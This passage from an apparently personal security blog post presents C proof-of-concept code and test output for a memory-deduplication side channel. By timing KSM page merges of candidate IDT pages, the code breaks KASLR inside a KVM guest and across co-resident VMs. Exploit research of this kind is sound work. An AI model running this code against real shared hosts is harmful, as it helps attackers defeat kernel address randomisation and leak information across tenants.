class="mh">0x81208e0000100690</span><span class="p">,</span> <span class="mh">0x81208e0000100698</span><span class="p">,</span> <span class="mh">0x81208e00001006a0</span><span class="p">,</span> <span class="mh">0x81208e00001006a8</span><span class="p">,</span> <span class="mh">0x81208e00001006b0</span><span class="p">,</span> <span class="mh">0x81208e00001006b8</span><span class="p">,</span> <span class="mh">0x81208e00001006c0</span><span class="p">,</span> <span class="mh">0x81208e00001006c8</span><span class="p">,</span> <span class="mh">0x81208e00001006d0</span><span class="p">,</span> <span class="mh">0x81208e00001006d8</span><span class="p">,</span> <span class="mh">0x81208e00001006e0</span><span class="p">,</span> <span class="mh">0x81208e00001006e8</span><span class="p">,</span> <span class="mh">0x81208e00001006f0</span><span class="p">,</span> <span class="mh">0x81208e00001006f8</span><span class="p">,</span> <span class="mh">0x81208e0000100700</span><span class="p">,</span> <span class="mh">0x81208e0000100708</span><span class="p">,</span> <span class="mh">0x81208e0000100710</span><span class="p">,</span> <span class="mh">0x81208e0000100718</span><span class="p">,</span> <span class="mh">0x81208e0000100720</span><span class="p">,</span> <span class="mh">0x81208e0000100728</span><span class="p">,</span> <span class="mh">0x81208e0000100730</span><span class="p">,</span> <span class="mh">0x81208e0000100738</span><span class="p">,</span> <span class="mh">0x81208e0000100740</span><span class="p">,</span> <span class="mh">0x81208e0000100748</span><span class="p">,</span> <span class="mh">0x81208e0000100750</span><span class="p">,</span> <span class="mh">0x81208e0000100758</span><span class="p">,</span> <span class="mh">0x81208e0000100760</span><span class="p">,</span> <span class="mh">0x81208e0000100768</span><span class="p">,</span> <span class="mh">0x81208e0000100770</span><span class="p">,</span> <span class="mh">0x81208e0000100778</span><span class="p">,</span> <span class="mh">0x81208e0000100780</span><span class="p">,</span> <span class="mh">0x81208e0000100788</span><span class="p">,</span> <span class="mh">0x81208e0000100790</span><span class="p">,</span> <span class="mh">0x81208e0000100798</span><span class="p">,</span> <span class="mh">0x81208e00001007a0</span><span class="p">,</span> <span class="mh">0x81208e00001007a8</span><span class="p">,</span> <span class="mh">0x81208e00001007b0</span><span class="p">,</span> <span class="mh">0x81208e00001007b8</span><span class="p">,</span> <span class="mh">0x81208e00001007c0</span><span class="p">,</span> <span class="mh">0x81208e00001007c8</span><span class="p">,</span> <span class="mh">0x81208e00001007d0</span><span class="p">,</span> <span class="mh">0x81208e00001007d8</span><span class="p">,</span> <span class="mh">0x81208e00001007e0</span><span class="p">,</span> <span class="mh">0x81208e00001007e8</span><span class="p">,</span> <span class="mh">0x81208e00001007f0</span><span class="p">,</span> <span class="mh">0x81208e00001007f8</span><span class="p">,</span> <span class="mh">0x81208e0000100800</span><span class="p">,</span> <span class="mh">0x81208e0000100808</span><span class="p">,</span> <span class="mh">0x81208e0000100810</span><span class="p">,</span> <span class="mh">0x81208e0000100818</span><span class="p">,</span> <span class="mh">0x81208e0000100820</span><span class="p">,</span> <span class="mh">0x81208e0000100828</span><span class="p">,</span> <span class="mh">0x81208e0000100830</span><span class="p">,</span> <span class="mh">0x81208e0000100838</span><span class="p">,</span> <span class="mh">0x81208e0000100840</span><span class="p">,</span> <span class="mh">0x81208e0000100848</span><span class="p">,</span> <span class="mh">0x81208e0000100850</span><span class="p">,</span> <span class="mh">0x81208e0000100858</span><span class="p">,</span> <span class="mh">0x81208e0000100860</span><span class="p">,</span> <span class="mh">0x81208e0000100868</span><span class="p">,</span> <span class="mh">0x81208e0000100870</span><span class="p">,</span> <span class="mh">0x81208e0000100878</span><span class="p">,</span> <span class="mh">0x81208e0000100eb0</span><span class="p">,</span> <span class="mh">0x81208e0000100888</span><span class="p">,</span> <span class="mh">0x81208e0000100890</span><span class="p">,</span> <span class="mh">0x81208e0000100898</span><span class="p">,</span> <span class="mh">0x81208e0000101050</span><span class="p">,</span> <span class="mh">0x81208e0000101030</span><span class="p">,</span> <span class="mh">0x81208e0000101010</span><span class="p">,</span> <span class="mh">0x81208e0000101110</span><span class="p">,</span> <span class="mh">0x81208e0000100fb0</span><span class="p">,</span> <span class="mh">0x81208e00001008c8</span><span class="p">,</span> <span class="mh">0x81208e0000100ff0</span><span class="p">,</span> <span class="mh">0x81208e0000100ed0</span><span class="p">,</span> <span class="mh">0x81208e0000100f30</span><span class="p">,</span> <span class="mh">0x81208e0000100f90</span><span class="p">,</span> <span class="mh">0x81208e0000100fd0</span><span class="p">,</span> <span class="mh">0x81208e0000100f50</span><span class="p">,</span> <span class="mh">0x81208e0000100f70</span><span class="p">,</span> <span class="mh">0x81208e0000100ef0</span><span class="p">,</span> <span class="mh">0x81208e0000100e70</span><span class="p">,</span> <span class="mh">0x81208e0000100e90</span> <span class="p">};</span></code></pre></figure>

<p>With that array created it is very easy to produce an IDT page for a potential KASLR offset:</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="o">*</span><span class="nf">setup_idt_page</span><span class="p">(</span><span class="kt">uint16_t</span> <span class="n">offset</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">uint64_t</span> <span class="o">*</span><span class="n">page</span> <span class="o">=</span> <span class="n">alloc_page</span><span class="p">();</span>
    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">256</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="kt">uint64_t</span> <span class="n">shifted_offset</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">offset</span> <span class="o">&lt;&lt;</span> <span class="mi">53</span><span class="p">;</span>
        <span class="n">page</span><span class="p">[</span><span class="n">i</span><span class="o">*</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="n">shifted_offset</span> <span class="o">+</span> <span class="n">entries</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
        <span class="n">page</span><span class="p">[</span><span class="n">i</span><span class="o">*</span><span class="mi">2</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x00000000ffffffff</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="n">page</span><span class="p">;</span>
<span class="p">}</span></code></pre></figure>

<p>Now all that is left is to put it all together and we’ll have constructed an attack that can break KASLR within KVM by exploiting KSM on IDT pages!</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="c1">// create candidate IDT pages</span>
<span class="kt">void</span> <span class="o">*</span><span class="n">idt_pages</span><span class="p">[</span><span class="mi">512</span><span class="p">];</span>
<span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">512</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
    <span class="n">idt_pages</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">setup_idt_page</span><span class="p">(</span><span class="n">i</span><span class="p">);</span>

<span class="c1">// detect if any candidate pages were merged</span>
<span class="kt">int</span> <span class="n">attempt</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"-- beginning attempt %d --</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="o">++</span><span class="n">attempt</span><span class="p">);</span>
    <span class="kt">uint64_t</span> <span class="n">results</span><span class="p">[</span><span class="mi">512</span><span class="p">];</span>
    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">512</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="kt">void</span> <span class="o">*</span><span class="n">page</span> <span class="o">=</span> <span class="n">idt_pages</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
        <span class="n">time_access</span><span class="p">(</span><span class="n">page</span><span class="p">);</span>

        <span class="kt">uint64_t</span> <span class="n">first</span> <span class="o">=</span> <span class="n">time_poke</span><span class="p">(</span><span class="n">page</span><span class="p">);</span>
        <span class="kt">uint64_t</span> <span class="n">second</span> <span class="o">=</span> <span class="n">time_poke</span><span class="p">(</span><span class="n">page</span><span class="p">);</span>

        <span class="kt">void</span> <span class="o">*</span><span class="n">base</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="mh">0xffffffff80000000</span> <span class="o">+</span> <span class="p">(</span><span class="n">i</span> <span class="o">&lt;&lt;</span> <span class="mi">21</span><span class="p">);</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"%p (%#03x): %ld =&gt; %ld</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">base</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="n">first</span><span class="p">,</span> <span class="n">second</span><span class="p">);</span>
        <span class="n">results</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">first</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">for</span> <span class="p">(</span><span class="kt">uint64_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">512</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">results</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&gt;</span> <span class="n">MERGE_THRESHOLD</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">printf</span><span class="p">(</span><span class="s">"detected merged page at index %#03lx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">i</span><span class="p">);</span>
            <span class="n">printf</span><span class="p">(</span><span class="s">"kernel base = %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="mh">0xffffffff80000000</span> <span class="o">+</span> <span class="p">(</span><span class="n">i</span> <span class="o">&lt;&lt;</span> <span class="mi">21</span><span class="p">));</span>
            <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="n">sleep</span><span class="p">(</span><span class="mi">20</span><span class="p">);</span>
<span class="p">}</span></code></pre></figure>

<p>Under the default configurations for KSM on my host machine, I got a successful KASLR break in just under nine minutes on a VM that had been up for several minutes.</p>

<p>To see the attack working without having to wait so long, consider lowering KSM’s sleep_miliseconds config value to something more like 20ms.</p>

<h3 id="breaking-kaslr-across-vms">breaking KASLR across VMs</h3>

<p>Okay how about across VMs now? well, there isn’t actually anything more to do.</p>

<p>The code to break KASLR on the current VM already works across VMs, it will detect any matching IDTs that exist on any running VMs so long as they are using KSM.</p>

<p>Just to confirm this, I ran two VMs with the same kernel image and just removed the exit condition from the loop of the attack so it would keep running even if it found a deduplicated IDT page, and here are the results:</p>

<p>VM 1:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@host:~/kvm-kaslr# cat /proc/kallsyms | grep "T _text"
ffffffffb5800000 T _text
</code></pre></div></div>

<p>VM 2:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/home/root # cat /proc/kallsyms | grep "T _text"
ffffffffb4400000 T _text
</code></pre></div></div>

<p>After running the attack for a while I got this:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>detected merged page at index 0x1ac
kernel base = 0xffffffffb5800000
</code></pre></div></div>

<p>Followed shortly by:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>detected merged page at index 0x1a2
kernel base = 0xffffffffb4400000
</code></pre></div></div>

<p>Cross VM leakage achieved!</p>

<h2 id="closing-thoughts">closing thoughts</h2>

<p>Deduplication attacks are pretty cool and fairly simple to pull off, but I am slightly concerned that KSM was enabled on my machine without me knowing… not that I was exposing any VMs to the internet anyways but since it was enabled on my machine I worry where else is it might be unknowningly enabled. All I exploited it for in this post was breaking KASLR, but theoretically it could be used to leak the contents of any page from any VM on the system, and research has been done to see just how far it can be pushed[6].</p>

<p>Hope you learned something! This is my first attempt at blogging, it turned out a bit more code dense than I’d have liked, but hopefully the all the code examples made it easier to follow. I do kind of like the format of exploring an attack class and progressively developing an attack of that type, so maybe I’ll do it again sometime.</p>

<h2 id="sources">sources</h2>

<p>[1] Rodney Owens and Weichao Wang. Non-interactive OS fingerprinting through memory de-duplication technique in virtual machines. In International Performance Computing and Communications Conference, 2011.</p>

<p>[2] Taehun Kim, Taehyun Kim, and Youngjoo Shin. Breaking kaslr using memory deduplication in virtualized environments. Electronics, 2021. URL: https://www.mdpi.com/2079-9292/10/17/2174.</p>

<p>[3] Antonio Barresi, Kaveh Razavi, Mathias Payer, and Thomas R. Gross. CAIN: silently breaking ASLR in the cloud. In WOOT, 2015.</p>

<p>[4] Martin Schwarzl, Erik Kraft, Moritz Lipp, and Daniel Gruss. Remote Page Deduplication Attacks. In NDSS, 2022.</p>

<p>[5] K. Razavi, B. Gras, E. Bosman, B. Preneel, C. Giuffrida, and H. Bos. Flip Feng Shui: Hammering a Needle in the Software Stack. in SEC, 2016.</p>

<p>[6] E. Bosman, K. Razavi, H. Bos, and C. Giuffrida. Dedup Est Machina: Memory Deduplication as an Advanced Exploitation Vector. In SP, 2016.</p>

<p>[7] <a href="https://lwn.net/Articles/306704/">lwn: /dev/ksm: dynamic memory sharing</a></p>]]></content><author><name>Justin Miller</name></author><category term="Exploitation" /><category term="Sidechannels" /><category term="Linux" /><category term="KVM" /><category term="KASLR" /><summary type="html"><![CDATA[I recently came across a bunch of research describing attacks on memory deduplication, it has been used to fingerprint systems[1], crack (K)ASLR[2,3,4], leak database records[4], and even exploit rowhammer[5]. It’s a really cool class of attacks that I hadn’t heard of before, but I wasn’t having much luck finding any POCs for these attacks… So, I figured I’d write up what I learned about how these attacks work and write my own version of one of these attacks that can be used break KASLR in KVM for the current VM as well as across VMs.]]></summary></entry></feed>